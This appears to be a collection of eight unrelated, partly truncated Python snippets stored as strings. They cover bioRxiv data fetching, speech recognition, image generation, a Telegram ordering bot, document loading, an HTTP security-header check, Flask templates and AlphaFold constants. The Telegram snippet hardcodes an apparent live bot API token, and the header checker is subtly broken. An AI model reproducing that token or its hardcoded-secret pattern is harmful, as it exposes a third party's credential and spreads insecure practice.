    "import pandas as pd\r\nimport numpy as np\r\nfrom pathlib import Path\r\nimport datetime\r\nimport requests\r\nimport json\r\nimport os\r\nfrom datetime import datetime\r\nfrom dateutil.relativedelta import relativedelta\r\nfrom concurrent.futures import ThreadPoolExecutor, as_completed\r\nimport pandas as pd\r\nimport os\r\nimport json\r\nfrom pathlib import Path\r\nfrom sentence_transformers import SentenceTransformer, models\r\nimport torch\r\nimport shutil\r\nimport dropbox\r\nimport streamlit as st\r\n\r\ndef load_data_embeddings():\r\n    existing_data_path = \"aggregated_data\"\r\n    new_data_directory = \"db_update\"\r\n    existing_embeddings_path = \"biorxiv_ubin_embaddings.npy\"\r\n    updated_embeddings_directory = \"embed_update\"\r\n\r\n    # Load existing database and embeddings\r\n    df_existing = pd.read_parquet(existing_data_path)\r\n    embeddings_existing = np.load(existing_embeddings_path, allow_pickle=True)\r\n\r\n    # Prepare lists to collect new updates\r\n    df_updates_list = []\r\n    embeddings_updates_list = []\r\n\r\n    # Ensure pairing of new data and embeddings by their matching filenames\r\n    new_data_files = sorted(Path(new_data_directory).glob(\"*.parquet\"))\r\n    for data_file in new_data_files:\r\n        # Assuming naming convention allows direct correlation\r\n        corresponding_embedding_file = Path(updated_embeddings_directory) / (\r\n            data_file.stem + \".npy\"\r\n        )\r\n\r\n        if corresponding_embedding_file.exists():\r\n            # Load and append DataFrame and embeddings\r\n            df_updates_list.append(pd.read_parquet(data_file))\r\n            embeddings_updates_list.append(np.load(corresponding_embedding_file))\r\n        else:\r\n            print(f\"No corresponding embedding file found for {data_file.name}\")\r\n\r\n    # Concatenate all updates\r\n    if df_updates_list:\r\n        df_updates = pd.concat(df_updates_list)\r\n    else:\r\n        df_updates = pd.DataFrame()\r\n\r\n    if embeddings_updates_list:\r\n        embeddings_updates = np.vstack(embeddings_updates_list)\r\n    else:\r\n        embeddings_updates = np.array([])\r\n\r\n    # Append new data to existing, handling duplicates as needed\r\n    df_combined = pd.concat([df_existing, df_updates])\r\n\r\n    # create a mask for filtering\r\n    mask = ~df_combined.duplicated(subset=[\"title\"], keep=\"last\")\r\n    df_combined = df_combined[mask]\r\n\r\n    # Combine embeddings, ensuring alignment with the DataFrame\r\n    embeddings_combined = (\r\n        np.vstack([embeddings_existing, embeddings_updates])\r\n        if embeddings_updates.size\r\n        else embeddings_existing\r\n    )\r\n\r\n    # filter the embeddings based on dataframe unique entries\r\n    embeddings_combined = embeddings_combined[mask]\r\n\r\n    return df_combined, embeddings_combined\r\n\r\n# Fast fetch data from bioRxiv\r\n\r\ndef fetch_and_save_data_block(endpoint, server, block_start, block_end, save_directory, format='json'):\r\n    base_url = f\"https://api.biorxiv.org/{endpoint}/{server}/\"\r\n    block_interval = f\"{block_start.strftime('%Y-%m-%d')}/{block_end.strftime('%Y-%m-%d')}\"\r\n    block_data = []\r\n    cursor = 0\r\n    continue_fetching = True\r\n\r\n    while continue_fetching:\r\n        url = f\"{base_url}{block_interval}/{cursor}/{format}\"\r\n        response = requests.get(url)\r\n\r\n        if response.status_code != 200:\r\n            print(f\"Failed to fetch data for block {block_interval} at cursor {cursor}. HTTP Status: {response.status_code}\")\r\n            break\r\n\r\n        data = response.json()\r\n        fetched_papers = len(data['collection'])\r\n\r\n        if fetched_papers > 0:\r\n            block_data.extend(data['collection'])\r\n            cursor += fetched_papers  # Update the cursor to fetch next set of data\r\n            print(f\"Fetched {fetched_papers} papers for block {block_interval}. Total fetched: {cursor}.\")\r\n        else:\r\n            continue_fetching = False\r\n\r\n    if block_data:\r\n        save_data_block(block_data, block_start, block_end, endpoint, save_directory)\r\n\r\ndef save_data_block(block_data, start_date, end_date, endpoint, save_directory):\r\n    start_yymmdd = start_date.strftime(\"%y%m%d\")\r\n    end_yymmdd = end_date.strftime(\"%y%m%d\")\r\n    filename = f\"{save_directory}/{endpoint}_data_{start_yymmdd}_{end_yymmdd}.json\"\r\n    \r\n    with open(filename, 'w') as file:\r\n        json.dump(block_data, file, indent=4)\r\n    \r\n    print(f\"Saved data block to {filename}\")\r\n\r\ndef fetch_data(endpoint, server, interval, save_directory, format='json'):\r\n    os.makedirs(save_directory, exist_ok=True)\r\n    start_date, end_date = [datetime.strptime(date, \"%Y-%m-%d\") for date in interval.split('/')]\r\n    current_date = start_date\r\n    tasks = []\r\n\r\n    with ThreadPoolExecutor(max_workers=12) as executor:  # Adjust the number of workers as needed\r\n        while current_date <= end_date:\r\n            block_start = current_date\r\n            block_end = min(current_date + relativedelta(months=1) - relativedelta(days=1), end_date)\r\n            tasks.append(executor.submit(fetch_and_save_data_block, endpoint, server, block_start, block_end, save_directory, ",
    "# Copyright (c) 2024, Zhendong Peng (pzd17@tsinghua.org.cn)\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nimport click\nfrom loguru import logger\n\nimport utils\n\n\n@click.command()\n@click.argument(\"wav_scp\", type=click.Path(exists=True, dir_okay=False))\n@click.option(\n    \"--model\",\n    type=click.Choice([\"paraformer\", \"whisper\"]),\n    default=\"paraformer\",\n    help=\"ASR model\",\n)\n@click.option(\n    \"--language\",\n    type=click.Choice([\"en\", \"zh\"]),\n    default=\"zh\",\n    help=\"ASR language\",\n)\n@click.option(\"--asr/--no-asr\", default=True, help=\"Do ASR\")\n@click.option(\"--batch_size\", default=16, help=\"Batch size for ASR\")\n@click.option(\"--panns/--no-panns\", default=False, help=\"Get audio tags\")\n@click.option(\"--pyannote/--no-pyannote\", default=False, help=\"Get num of speakers\")\n@click.option(\"--overwrite/--no-overwrite\", default=False, help=\"Overwrite outputs\")\n@click.option(\"--num-workers\", default=1, help=\"Number of workers to use\")\ndef main(\n    wav_scp, model, language, asr, panns, pyannote, overwrite, num_workers, batch_size\n):\n    if asr:\n        if model == \"paraformer\":\n            processor = utils.paraformer_transcribe\n        elif model == \"whisper\":\n            processor = utils.whisper_transcribe\n        utils.transcribe_audios(wav_scp, processor, overwrite, num_workers, batch_size)\n    if panns:\n        utils.transcribe_audios(wav_scp, utils.panns_tags, overwrite, num_workers)\n    if pyannote:\n        utils.transcribe_audios(\n            wav_scp, utils.pyannote_speakers, overwrite, num_workers\n        )\n    logger.info(\"Done!\")\n\n\nif __name__ == \"__main__\":\n    main()\n",
    "import torch\nfrom diffusers import (\n    AutoencoderKL, UNet2DConditionModel, EulerDiscreteScheduler\n)\nfrom transformers import CLIPTextModel, CLIPTokenizer, CLIPTextModelWithProjection\nfrom diffusers.models import ControlNetModel\nimport cv2\nimport numpy as np\nfrom compel import Compel, ReturnedEmbeddingsType\nimport math\nimport time\nfrom PIL import Image\n\nfrom pipeline_sdxl_instantid_fouriscale import StableDiffusionXLInstantIDFouriScalePipeline\n\nfrom fouriscale.models import TrainingFreeAttnProcessor\nfrom fouriscale.utils import read_base_settings, read_layer_settings, find_smallest_padding_pair\nfrom fouriscale.aux_xl import list_layers\n\nfrom InstantID.pipeline_stable_diffusion_xl_instantid import draw_kps\nfrom diffusers.utils import load_image\nfrom insightface.app import FaceAnalysis\n\ndef resize_and_pad(image_pil, size):\n    original_size = image_pil.size\n    target_w, target_h = size\n    \n    aspect_ratio = original_size[0] / original_size[1]\n    if (target_w / target_h) > aspect_ratio:\n        new_h = target_h\n        new_w = int(target_h * aspect_ratio)\n    else:\n        new_w = target_w\n        new_h = int(target_w / aspect_ratio)\n    \n    resized_image = image_pil.resize((new_w, new_h), Image.Resampling.LANCZOS)\n    \n    new_image = Image.new(\"RGB\", (target_w, target_h))\n    \n    left = (target_w - new_w) // 2\n    top = (target_h - new_h) // 2\n    \n    new_image.paste(resized_image, (left, top))\n    \n    return new_image\n\n\ndef main():\n    # args\n    pretrained_model_name_or_path = 'wangqixun/YamerMIX_v8'\n    weight_dtype = torch.float16\n    target_height = 2048\n    target_width = 2048\n    # set referring image\n    face_img = load_image(\"./InstantID/examples/kaifu_resize.png\")\n    pose_img = load_image(\"./InstantID/examples/poses/pose.jpg\")\n    # set prompt\n    prompt = \"film noir style, ink sketch|vector, male man, highly detailed, sharp focus, ultra sharpness, monochrome, high contrast, dramatic shadows, 1940s style, mysterious, cinematic\"\n    neg_prompt = \"ugly, deformed, noisy, blurry, low contrast, realism, photorealistic, vibrant, colorful\"\n\n    # InstanID args\n    controlnet_conditioning_scale=0.8\n    ip_adapter_scale=0.8\n    # FouriScale args\n    start_step = 12 # 20*(30/50)=12              original start_step in FouriScale config is 20\n    stop_step=21 # # 35*(30/50)=21               original start_step in FouriScale config is 35\n    # Generation args\n    num_inference_steps=30 # lower cost of time. original num_inference_steps in FouriScale config is 50\n    guidance_scale=5.5\n\n    # Load Fouriscale Setting\n    layer_settings = read_layer_settings(\"./fouriscale/assets/layer_settings/sdxl.txt\")\n    base_settings = read_base_settings(\"./fouriscale/assets/base_settings/sdxl.txt\")\n\n    tokenizer = CLIPTokenizer.from_pretrained(\n        pretrained_model_name_or_path, subfolder=\"tokenizer\", torch_dtype=weight_dtype\n    )\n    tokenizer_2 = CLIPTokenizer.from_pretrained(\n        pretrained_model_name_or_path, subfolder=\"tokenizer_2\", torch_dtype=weight_dtype\n    )\n    text_encoder = CLIPTextModel.from_pretrained(\n        pretrained_model_name_or_path, subfolder=\"text_encoder\", torch_dtype=weight_dtype\n    )\n    text_encoder_2 = CLIPTextModelWithProjection.from_pretrained(\n        pretrained_model_name_or_path, subfolder=\"text_encoder_2\", torch_dtype=weight_dtype\n    )\n    vae = AutoencoderKL.from_pretrained(\n        pretrained_model_name_or_path, subfolder=\"vae\", torch_dtype=weight_dtype\n    )\n    unet = UNet2DConditionModel.from_pretrained(\n        pretrained_model_name_or_path, subfolder=\"unet\", torch_dtype=weight_dtype\n    )\n    unet.set_attn_processor({name: TrainingFreeAttnProcessor(name) for name in list_layers})\n\n    noise_scheduler = EulerDiscreteScheduler.from_pretrained(pretrained_model_name_or_path, subfolder=\"scheduler\")\n\n    # # prepare InstantID model under ./InstantID/checkpointsInstantID\n    face_adapter = './InstantID/checkpoints/ip-adapter.bin'\n    controlnet_path = './InstantID/checkpoints/ControlNetModel'\n\n    # prepare 'antelopev2' under ./InstantID/models\n    app = FaceAnalysis(name='antelopev2', root='./InstantID/', providers=['CUDAExecutionProvider','CPUExecutionProvider'])\n    app.prepare(ctx_id=0, det_size=(640, 640))\n\n    # Load pipeline\n    controlnet = ControlNetModel.from_pretrained(controlnet_path, torch_dtype=torch.float16)\n    pipeline = StableDiffusionXLInstantIDFouriScalePipeline(\n        vae=vae,\n        text_encoder=text_encoder,\n        text_encoder_2=text_encoder_2,\n        tokenizer=tokenizer,\n        tokenizer_2=tokenizer_2,\n        unet=unet,\n        scheduler=noise_scheduler,\n        controlnet=controlnet,\n    )\n    pipeline.cuda()\n    unet.eval()\n\n    # load adapter\n    pipeline.load_ip_adapter_instantid(face_adapter)\n\n    # init compel for longer prompt\n    compel = Compel(tokenizer=[pipeline.tokenizer, pipeline.tokenizer_2],text_encoder=[pipeline.text_encoder, pipeline.text_encoder_2],returned_embeddings_type=ReturnedEmbeddingsType.PENULTIMATE_HIDDEN_STAT",
    "import random\nimport json\nimport pickle\n\nimport numpy as np\nimport telebot\nimport os\n\nos.environ['TF_CPP_MIN_LOG_LEVEL'] = '2'\n\nimport nltk\nfrom nltk.stem import WordNetLemmatizer\n\nfrom tensorflow.keras.models import load_model\n\nlemmatizer = WordNetLemmatizer()\nintents = json.loads(open('training\\intents.json').read())\nmenu = json.loads(open('training\\menu.json').read())\n\nwords = pickle.load(open('training\\words.pkl', 'rb'))\nlabels = pickle.load(open('training\\labels.pkl', 'rb'))\nmodel = load_model('training\\chatbot_model.h5')\n\n\nisOrder = False\ntotal_price = 0.00\n\ndef clean_up_sentence(sentence):\n    sentence_words = nltk.word_tokenize(sentence)\n    sentence_words = [lemmatizer.lemmatize(word) for word in sentence_words]\n    return sentence_words\n\n\ndef bagofwords(sentence):\n    sentence_words = clean_up_sentence(sentence)\n    bag = [0] * len(words)\n    for w in sentence_words:\n        for i, word in enumerate(words):\n            if word == w:\n                bag[i] = 1\n    return np.array(bag)\n\n\n# predict the class based on the sentence\ndef predict_class(sentence):\n    bow = bagofwords(sentence)\n    res = model.predict(np.array([bow]))[0]\n\n    # allows some uncertainty (error detection)\n    ERROR_THRESHOLD = 0.1\n    results = [[i, r] for i, r in enumerate(res) if r > ERROR_THRESHOLD]\n\n    # sort the results\n    results.sort(key=lambda x: x[1], reverse=True)\n    return_list = []\n    for r in results:\n        return_list.append({'intent': labels[r[0]], 'probability': str(r[1])})\n    return return_list\n\n\ndef get_response(intents_list, intents_json):\n    tag = intents_list[0]['intent']\n\n    list_of_intents = intents_json['intents']\n    for i in list_of_intents:\n\n        if i['tag'] == tag:\n            result = random.choice(i['responses'])\n\n            break\n    return result\n\n\ndef order_food(menu_json, id):\n    for x in menu_json:\n\n        if x[\"food_id\"] == id:\n            print(\"Food ID:\", \"\".join(x[\"food_id\"]))\n            print(\"Item name:\", \"\".join(x[\"item_name\"]))\n            print(\"Price:\", \"\".join(x[\"price\"]))\n            return float(x[\"price\"])\n\n\ndef print_stall_menu(menu_json, stall, delivery):\n    for x in menu_json:\n\n        # prints menu for delivery and for the stall\n        if delivery:\n            if x[\"stall_name\"] == stall and x[\"delivery_service\"] == 'yes':\n\n                print(\"Food ID:\", \"\".join(x[\"food_id\"]))\n                print(\"Stall name:\", \"\".join(x[\"stall_name\"]))\n                print(\"Item name:\", \"\".join(x[\"item_name\"]))\n                print(\"Price:\", \"\".join(x[\"price\"]))\n                print(\"Delivery Service:\", \"\".join(x[\"delivery_service\"]))\n                print(\"\\n\")\n\n        # prints menu for stall only\n        else:\n            if x[\"stall_name\"] == stall:\n                print(\"Food ID:\", \"\".join(x[\"food_id\"]))\n                print(\"Stall name:\", \"\".join(x[\"stall_name\"]))\n                print(\"Item name:\", \"\".join(x[\"item_name\"]))\n                print(\"Price:\", \"\".join(x[\"price\"]))\n                print(\"Delivery Service:\", \"\".join(x[\"delivery_service\"]))\n                print(\"\\n\")\n\n\ndef add_order(menu_json, order_id, cart):\n    input_dict = json.loads(menu_json)\n    output_dict = [x for x in input_dict if x['food_id'] == order_id]\n    res = json.dumps(output_dict)\n\n    cart.append(res)\n\n    return cart\n\n\n# API_KEY = os.getenv('API_KEY')\nbot = telebot.TeleBot('6834543597:AAHfo58IPxZq-cY7dvJEc_QUaTU_M1QknfE')\n\n\n@bot.message_handler(commands=['start'])\ndef start(message):\n    bot.send_message(message.chat.id, \"Hi! How can I help you? Would recommend you to start viewing the menu first.\")\n\n# @bot.message_handler(commands=['order'])\n# def start(message):\n#     bot.send_message(message.chat.id, \"Hi! How can I help you? Would recommend you to start viewing the menu first.\")\n#\n#\n#\n#     while temp:\n#         bot.send_message(message.chat.id, 'Type the food id of the food that u want:')\n#         food_id = input()\n#         price = order_food(menu, food_id)\n#         total_price += price  # Total price calculation here\n#\n#         print('Would you like to order anymore food? (1 = no)')\n#         flag = input()\n#\n#         if flag == '1':\n#             temp = False\n#\n#     print('Thanks for your order!')\n#     print('The total price is ')\n#     print(total_price)\n\n\n# shopping_cart_price = 0.00\n\n\n@bot.message_handler(func=lambda m: True)\ndef ordering_process(message):\n    delivery_service = False\n    global isOrder\n    global total_price\n\n    msg = message\n    msg2 = message.text\n\n    if isOrder:\n        food_id = message.text\n        bot.send_message(msg.chat.id, food_id)\n        if food_id.isnumeric():\n\n            price = order_food(menu, food_id)\n\n            total_price += price  # Total price calculation here\n\n            bot.send_message(msg.chat.id, \"Total Price: \" +str(total_price))\n\n        else:\n            bot.send_message(msg.chat.id, \"You did not enter an integer\")\n\n        isOrder=False\n    else:\n        ints = predict_class(msg2)\n        res = get_response",
    "import os\nimport pytube as pt\nfrom openai import OpenAI\nfrom dotenv import load_dotenv\nfrom utils.get_urls import scrape_urls\nfrom langchain.text_splitter import RecursiveCharacterTextSplitter\nfrom langchain_community.document_loaders import (\n    WebBaseLoader,\n    PyPDFLoader,\n    TextLoader,\n    CSVLoader,\n    UnstructuredWordDocumentLoader,\n    UnstructuredExcelLoader,\n)\n\nload_dotenv()\nclient = OpenAI()\n\ntext_splitter = RecursiveCharacterTextSplitter()\n\ndef fetch_and_split_data_from_youtube(youtube_url):\n    yt = pt.YouTube(youtube_url)\n    stream = yt.streams.filter(only_audio=True)[0]\n    stream.download(filename=\"./audio_english.mp3\")\n\n    audio_file = open(\"./audio_english.mp3\", \"rb\")\n    transcription = client.audio.transcriptions.create(\n        model=\"whisper-1\",\n        file=audio_file,\n        language='en',\n        response_format=\"text\"\n    )\n\n    document_chunks = text_splitter.create_documents(transcription)\n\n    return document_chunks, 1\n\n\ndef fetch_and_split_data_from_url(url: str, max_depth: int) -> tuple[list, int]:\n    \"\"\"\n    Fetches data from a given URL, scrapes additional URLs up to a specified depth,\n    and splits the loaded documents into chunks.\n\n    Args:\n        url (str): The URL to fetch data from.\n        max_depth (int): The maximum depth for URL scraping.\n\n    Returns:\n        tuple: A tuple containing a list of document chunks and the total number of URLs scraped.\n    \"\"\"\n\n    scraped_urls = scrape_urls(url, max_depth)\n    loader = WebBaseLoader(scraped_urls)\n    document = loader.load()\n    document_chunks = text_splitter.split_documents(document)\n\n    return document_chunks, len(scraped_urls)\n\n\ndef load_and_split_data_from_files(uploaded_files: list) -> tuple[list, int]:\n    \"\"\"\n    Loads data from uploaded files, handles different file formats, and splits the documents into chunks.\n\n    Args:\n        uploaded_files (list): A list of uploaded files.\n\n    Returns:\n        tuple: A tuple containing a list of document chunks and the total number of documents loaded.\n    \"\"\"\n\n    if not os.path.exists('src/uploads/'):\n        os.makedirs('src/uploads/')\n\n    all_chunks = []\n    for file_path in uploaded_files:\n        with open(os.path.join(\"src/uploads\", file_path.name), \"wb\") as f:\n                f.write(file_path.getvalue())\n\n        file_path_with_dir = os.path.join(\"src/uploads\", file_path.name)\n\n        # Choose loader based on file extension\n        if file_path_with_dir.endswith(\".pdf\"):\n            loader = PyPDFLoader(file_path_with_dir)\n        elif file_path_with_dir.endswith(\".txt\"):\n            loader = TextLoader(file_path_with_dir)\n        elif file_path_with_dir.endswith(\".csv\"):\n            loader = CSVLoader(file_path_with_dir)\n        elif file_path_with_dir.endswith(\".doc\") or file_path_with_dir.endswith(\".docx\"):\n            loader = UnstructuredWordDocumentLoader(file_path)\n        elif file_path_with_dir.endswith(\".xlsx\"):\n            loader = UnstructuredExcelLoader(file_path, mode=\"elements\")\n        else:\n            print(f\"Unsupported file format: {file_path_with_dir}\")\n            continue\n\n        document = loader.load()\n        document_chunks = text_splitter.split_documents(document)\n        all_chunks.extend(document_chunks)\n\n    return all_chunks, len(document)\n\n\ndef load_data(url: str, max_depth: int, uploaded_files: list, youtube: str):\n    \"\"\"\n    Loads data from a URL (with scraping) and uploaded files, handling different file formats\n    and splitting documents into chunks.\n\n    Args:\n        url (str): The URL to fetch data from.\n        max_depth (int): The maximum depth for URL scraping.\n        uploaded_files (list): A list of uploaded files.\n\n    Returns:\n        tuple: A tuple containing a list of document chunks and the total number of documents loaded.\n    \"\"\"\n\n    final_chunks = []\n    total_loaded = 0\n\n    if url:\n        web_chunks, num_scraped = fetch_and_split_data_from_url(url, max_depth)\n        total_loaded += num_scraped\n        final_chunks.extend(web_chunks)\n\n    if uploaded_files and uploaded_files is not None:\n        file_chunks, num_files = load_and_split_data_from_files(uploaded_files)\n        total_loaded += num_files\n        final_chunks.extend(file_chunks)\n\n    if youtube:\n        chunks, num_scraped = fetch_and_split_data_from_youtube(youtube)\n        total_loaded += num_scraped\n        final_chunks.extend(chunks)\n\n    return final_chunks, total_loaded\n",
    "#  Verify HTTP security headers\n#\n# The code performs 3 steps:\n#   1. Send request\n#   2. Verify responses for HTTP headers\n#   3. Print results\n\n\nimport requests\n\nPASSED = \"Passed\"\nNOT_PASSED = \"Not passed\"\n\nverifications = []  # A list that used in verify_response() to collect results of verification (Trues and Falses)\n\n\ndef send_request():\n    # There will be your request from Burp\n\n    # Set the response to the request to the 'response' variable and then send it to verify_response()\n    response = \"\"\n    verify_response(response)\n\n\ndef verify_response(response):\n    http = False\n\n    missing_headers = []\n    headers = ['Strict-Transport-Security',\n               'Content-Security-Policy',\n               'X-Content-Type-Options',\n               'X-Frame-Options']\n\n    for header in headers:\n        if header not in response.headers:\n            missing_headers.append(header)\n\n    missing_headers = [header for header in headers if header not in response.headers]\n\n    if not missing_headers:\n        http = True\n    else:\n        http = False\n\n    # Appending the results of checks to the verifications[] so that you can later check it for PASSED or NOT PASSED checks.\n    # You can change the items that will be added to the list,\n    # for example, adding \"HTTP_CODE\":response.status_code and output the HTTP code of each check\n    verifications.append(\n        {\n            \"HTTP\": http,\n            \"MISSING_HEADERS\": missing_headers,\n        }\n    )\n\n\n# Checking for PASSED or NOT PASSED checks and printing results\ndef print_results():\n    for verification in verifications:\n        if verification[\"HTTP\"] is False or verification[\"MESSAGE\"] is False:\n            print(NOT_PASSED, verification)\n        else:\n            print(PASSED, verification)\n\n\nsend_request()\nprint_results()\n\n\n",
    "GITIGNORE = \\\n\"\"\"\n*.db\nvenv/\nconfig/.venv\n__pycache__\n/__pycache__\n**/*/__pycache__\n\"\"\"\n\n\nAPP_STARTUP = \\\n\"\"\"\nfrom my_demo_app import db, app\n\n\nif __name__ == \"__main__\":\n    with app.app_context():\n        db.create_all()\n        # db.drop_all()    \n    app.run(debug=True, port=5000)\n\"\"\"\n\n\nVIEW_TEMPLATE_CODE = \\\n\"\"\"\nimport os\nfrom my_demo_app import app\nfrom flask import render_template, Blueprint, send_from_directory, abort\n\n\nview = Blueprint(\"view\", __name__, template_folder=\"templates\", static_folder=\"static\")\n\n\n@view.route(\"/\")\ndef home_page():\n    # This function retrieves a list of allowed image filenames and renders the homepage template.\n\n    # Get list of all files in the upload folder\n    files = os.listdir(app.config[\"UPLOAD_FOLDER\"])\n\n    # Create an empty list to store allowed image filenames\n    images = []\n\n    # Loop through each file in the upload folder\n    for file in files:\n        # Extract the file extension and convert it to lowercase\n        extention = os.path.splitext(file)[1].lower()\n\n        # Check if the extension is allowed (e.g., \".jpg\", \".png\")\n        if extention in app.config[\"ALLOWED_EXTENSIONS\"]:\n            # If the extension is allowed, add the filename to the images list\n            images.append(file)\n\n    # Render the homepage template and pass the list of images\n    return render_template(\"index.html\", images=images)\n\n\n# @view.route(\"/\")\n# def home_page():\n#     # This function retrieves a list of allowed image filenames using list comprehension and renders the homepage template.\n\n#     # Get list of all files in the upload folder\n#     files = os.listdir(app.config[\"UPLOAD_FOLDER\"])\n\n#     # Use list comprehension to filter allowed image filenames based on extension\n#     images = [file for file in files if os.path.splitext(file)[1].lower() in app.config[\"ALLOWED_EXTENSIONS\"]\n#     ]\n\n#     # Render the homepage template and pass the list of images\n#     return render_template(\"index.html\", images=images)\n\n\n@view.route(\"/serve-image/<filename>\", methods=[\"GET\"])\ndef serve_image(filename):\n    # This function serves an image from the uploads folder based on the provided filename in the URL.\n\n    # Construct the full path to the image file\n    image_path = os.path.join(app.config[\"UPLOAD_FOLDER\"], filename)\n\n    # Check if the requested image file exists\n    if not os.path.isfile(image_path):\n\n        # Abort the request with a 404 Not Found status code\n        abort(404)\n\n    # Use Flask's send_from_directory utility to serve the image\n    return send_from_directory(directory=app.config[\"UPLOAD_FOLDER\"], path=filename)\n\"\"\"\n\n\nSEARCH_FORM_DATA = \\\n\"\"\" \nfrom flask_wtf import FlaskForm\nfrom wtforms.validators import DataRequired\nfrom wtforms import SearchField, SubmitField\n\n\nclass ProductSearchForm(FlaskForm):\n    search_query = SearchField(validators=[DataRequired()], render_kw={\"placeholder\": \"Search product name\"})\n    submit = SubmitField(label=\"Search\")\n\"\"\"\n\n\nSEARCH_TEMPLATE_CODE = \\\n\"\"\"\nfrom sqlalchemy import or_\nfrom my_demo_app import limiter\nfrom .form import ProductSearchForm\nfrom my_demo_app.database.models import User\nfrom flask import render_template, Blueprint, flash\n\n\nsearch_ = Blueprint(\n    \"search_\", __name__, template_folder=\"templates\", static_folder=\"static\"\n)\n\n\n@search_.route(\"/\")\n@limiter.limit(\"5 per minute\", override_defaults=True)\ndef search_item():\n    form = ProductSearchForm()\n    search_results = []  # Intialize early to avoid UnboundLocalError\n\n    if form.validate_on_submit():\n        search_query = form.search_query.data\n        search_results = User.query.filter(\n            User.username.ilike(f\"%{search_query}%\")\n        ).all()\n        if search_results:\n            flash(\n                message=f\"{len(search_query)}Data found for query: {search_query}\",\n                category=\"success\",\n            )\n        else:\n            flash(message=f\"Data not found for query: {search_query}\", category=\"error\")\n    return render_template(\"item_search.html\", form=form, search_results=search_results)\n\"\"\"\n\n\nERROR_HANDLER_TEMPLATE_CODE = \\\n\"\"\"\nfrom flask import session\nfrom college_mgs import app\nfrom http import HTTPStatus\nfrom flask import render_template, Blueprint, flash\n\n\nerrors_ = Blueprint(\n    \"errors_\", __name__, template_folder=\"templates\", static_folder=\"static\"\n)\n\n\n@errors_.app_errorhandler(403)\ndef forbidden_error(error):\n    return render_template(\"forbidden.html\"), HTTPStatus.FORBIDDEN\n\n\n@errors_.app_errorhandler(404)\ndef not_found_error(error):\n    return render_template(\"not_found.html\"), HTTPStatus.NOT_FOUND\n\n\n@errors_.app_errorhandler(413)\ndef payload_too_large_error(error):\n    return render_template(\"payload_data.html\"), HTTPStatus.PAYLOAD_TOO_LARGE\n\n\n@errors_.app_errorhandler(429)\ndef too_many_requests_error(error):\n    flash(\n        message=\"Your request is too much, try again in a few minutes\", category=\"error\"\n    )\n    return render_template(\"too_many_requests_error.html\"), HTTPStatus.TOO_MANY_REQUESTS\n\n\n@errors_.",
    "# Copyright 2021 AlQuraishi Laboratory\n# Copyright 2021 DeepMind Technologies Limited\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#      http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\n\"\"\"Constants used in AlphaFold.\"\"\"\n\nimport collections\nimport functools\nfrom typing import Mapping, List, Tuple\nfrom importlib import resources\n\nimport numpy as np\nimport tree\n\n# Internal import (35fd).\n\n\n# Distance from one CA to next CA [trans configuration: omega = 180].\nca_ca = 3.80209737096\n\n# Format: The list for each AA type contains chi1, chi2, chi3, chi4 in\n# this order (or a relevant subset from chi1 onwards). ALA and GLY don't have\n# chi angles so their chi angle lists are empty.\nchi_angles_atoms = {\n    \"ALA\": [],\n    # Chi5 in arginine is always 0 +- 5 degrees, so ignore it.\n    \"ARG\": [\n        [\"N\", \"CA\", \"CB\", \"CG\"],\n        [\"CA\", \"CB\", \"CG\", \"CD\"],\n        [\"CB\", \"CG\", \"CD\", \"NE\"],\n        [\"CG\", \"CD\", \"NE\", \"CZ\"],\n    ],\n    \"ASN\": [[\"N\", \"CA\", \"CB\", \"CG\"], [\"CA\", \"CB\", \"CG\", \"OD1\"]],\n    \"ASP\": [[\"N\", \"CA\", \"CB\", \"CG\"], [\"CA\", \"CB\", \"CG\", \"OD1\"]],\n    \"CYS\": [[\"N\", \"CA\", \"CB\", \"SG\"]],\n    \"GLN\": [\n        [\"N\", \"CA\", \"CB\", \"CG\"],\n        [\"CA\", \"CB\", \"CG\", \"CD\"],\n        [\"CB\", \"CG\", \"CD\", \"OE1\"],\n    ],\n    \"GLU\": [\n        [\"N\", \"CA\", \"CB\", \"CG\"],\n        [\"CA\", \"CB\", \"CG\", \"CD\"],\n        [\"CB\", \"CG\", \"CD\", \"OE1\"],\n    ],\n    \"GLY\": [],\n    \"HIS\": [[\"N\", \"CA\", \"CB\", \"CG\"], [\"CA\", \"CB\", \"CG\", \"ND1\"]],\n    \"ILE\": [[\"N\", \"CA\", \"CB\", \"CG1\"], [\"CA\", \"CB\", \"CG1\", \"CD1\"]],\n    \"LEU\": [[\"N\", \"CA\", \"CB\", \"CG\"], [\"CA\", \"CB\", \"CG\", \"CD1\"]],\n    \"LYS\": [\n        [\"N\", \"CA\", \"CB\", \"CG\"],\n        [\"CA\", \"CB\", \"CG\", \"CD\"],\n        [\"CB\", \"CG\", \"CD\", \"CE\"],\n        [\"CG\", \"CD\", \"CE\", \"NZ\"],\n    ],\n    \"MET\": [\n        [\"N\", \"CA\", \"CB\", \"CG\"],\n        [\"CA\", \"CB\", \"CG\", \"SD\"],\n        [\"CB\", \"CG\", \"SD\", \"CE\"],\n    ],\n    \"PHE\": [[\"N\", \"CA\", \"CB\", \"CG\"], [\"CA\", \"CB\", \"CG\", \"CD1\"]],\n    \"PRO\": [[\"N\", \"CA\", \"CB\", \"CG\"], [\"CA\", \"CB\", \"CG\", \"CD\"]],\n    \"SER\": [[\"N\", \"CA\", \"CB\", \"OG\"]],\n    \"THR\": [[\"N\", \"CA\", \"CB\", \"OG1\"]],\n    \"TRP\": [[\"N\", \"CA\", \"CB\", \"CG\"], [\"CA\", \"CB\", \"CG\", \"CD1\"]],\n    \"TYR\": [[\"N\", \"CA\", \"CB\", \"CG\"], [\"CA\", \"CB\", \"CG\", \"CD1\"]],\n    \"VAL\": [[\"N\", \"CA\", \"CB\", \"CG1\"]],\n}\n\n# If chi angles given in fixed-length array, this matrix determines how to mask\n# them for each AA type. The order is as per restype_order (see below).\nchi_angles_mask = [\n    [0.0, 0.0, 0.0, 0.0],  # ALA\n    